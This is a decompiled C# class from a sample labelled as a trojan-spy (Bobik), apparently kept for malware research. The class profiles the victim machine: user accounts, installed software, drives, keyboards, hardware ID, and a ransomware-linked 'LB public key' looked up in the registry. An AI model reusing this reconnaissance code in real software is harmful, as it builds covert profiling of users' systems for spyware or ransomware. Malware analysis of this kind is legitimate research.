// Decompiled with JetBrains decompiler
// Type: setup.OSInfo
// Assembly: setup, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 95C225EB-6E6B-4374-8E73-8564F911E43A
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Spy.MSIL.Bobik.gen-c7f353c4ca722da712da454317e9d00b77c9b6cf6194b47009dbd67517cf2abc.exe

using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Management;
using System.Threading;
using System.Windows.Forms;

namespace setup
{
  internal class OSInfo
  {
    public static string GetOSLang() => CultureInfo.InstalledUICulture.EnglishName;

    public static string GetOSName() => (string) Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "ProductName", (object) "UNKNOWN");

    public static string GetTimeZone() => "UTC" + TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now).Hours.ToString("+#;-#; Standard Time");

    public static string[] GetUsers()
    {
      try
      {
        List<string> stringList = new List<string>();
        string machineName = Environment.MachineName;
        foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT Disabled,Caption FROM Win32_UserAccount").Get())
        {
          if (!(bool) managementBaseObject["Disabled"])
          {
            string str = managementBaseObject["Caption"].ToString().Trim();
            if (str.StartsWith(machineName))
              str = str.Substring(machineName.Length + 1);
            if (str.Length > 0)
              stringList.Add(str);
          }
        }
        return stringList.ToArray();
      }
      catch (Exception ex)
      {
        return new string[1]{ OSInfo.PrettyException(ex) };
      }
    }

    public static string[] GetInstalledSoft()
    {
      try
      {
        List<string> stringList = new List<string>();
        string[] strArray = new string[2]
        {
          "SOFTWARE",
          "SOFTWARE\\Wow6432Node"
        };
        foreach (string str1 in strArray)
        {
          using (RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey(str1 + "\\Microsoft\\Windows\\CurrentVersion\\Uninstall"))
          {
            foreach (string subKeyName in registryKey1.GetSubKeyNames())
            {
              using (RegistryKey registryKey2 = registryKey1.OpenSubKey(subKeyName))
              {
                string str2 = Convert.ToString(registryKey2.GetValue("DisplayName"));
                if (str2.Length > 0)
                  stringList.Add(str2.ToString());
              }
            }
          }
        }
        return stringList.ToArray();
      }
      catch (Exception ex)
      {
        return new string[1]{ OSInfo.PrettyException(ex) };
      }
    }

    public static string[] GetKeyboards()
    {
      try
      {
        List<string> stringList = new List<string>();
        foreach (InputLanguage installedInputLanguage in (ReadOnlyCollectionBase) InputLanguage.InstalledInputLanguages)
          stringList.Add(installedInputLanguage.LayoutName);
        return stringList.ToArray();
      }
      catch (Exception ex)
      {
        return new string[1]{ OSInfo.PrettyException(ex) };
      }
    }

    public static string[] GetDrivesInfo()
    {
      try
      {
        List<string> stringList = new List<string>();
        foreach (DriveInfo drive in DriveInfo.GetDrives())
        {
          try
          {
            string[] strArray1 = new string[2]{ "1", "1" };
            try
            {
              strArray1 = new string[2]
              {
                drive.TotalSize.ToString(),
                (drive.TotalSize - drive.AvailableFreeSpace).ToString()
              };
            }
            catch (Exception ex)
            {
            }
            string[] strArray2 = new string[4]
            {
              drive.Name.TrimEnd('\\'),
              drive.DriveType.ToString(),
              strArray1[0],
              strArray1[1]
            };
            stringList.Add(string.Join("||", strArray2));
          }
          catch (Exception ex)
          {
            stringList.Add(OSInfo.PrettyException(ex));
          }
        }
        return stringList.ToArray();
      }
      catch (Exception ex)
      {
        return new string[1]{ OSInfo.PrettyException(ex) };
      }
    }

    public static string GetHardwareID() => Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig").GetValue("LastConfig").ToString().Trim('{', '}');

    public static string LBRegID()
    {
      try
      {
        for (int index1 = 0; index1 < 10; ++index1)
        {
          using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software"))
          {
            foreach (string subKeyName in registryKey.GetSubKeyNames())
            {
              if (subKeyName.ToUpper() == subKeyName && registryKey.OpenSubKey(subKeyName).GetValue("Public", (object) new byte[0]) is byte[] numArray && numArray.Length >= 8)
              {
                string str = "";
                for (int index2 = 0; index2 <= 8; ++index2)
                  str += numArray[index2].ToString("X2");
                return str;
              }
            }
          }
          Thread.Sleep(3000);
        }
        throw new Exception("LB public key not found!");
      }
      catch (Exception ex)
      {
        return OSInfo.PrettyException(ex);
      }
    }

    private static string PrettyException(Exception Exc) => string.Format("[{0}] {1}", (object) Exc.GetType().FullName, (object) Exc.Message.Trim().Replace("\r\n", " "));
  }
}
